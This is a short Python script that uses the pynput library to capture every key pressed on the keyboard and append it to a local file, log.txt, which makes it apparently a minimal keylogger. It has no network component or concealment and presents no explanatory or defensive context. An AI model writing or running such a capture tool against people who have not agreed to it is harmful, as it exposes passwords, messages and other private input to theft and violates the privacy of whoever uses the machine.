from pynput.keyboard import Listener


def write_to_file(key):
    keydata = str(key).replace("'", "")
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(keydata)

try:
    with Listener(on_press=write_to_file) as listener:
        listener.join()
except Exception as e:
    print(f"Error: {e}")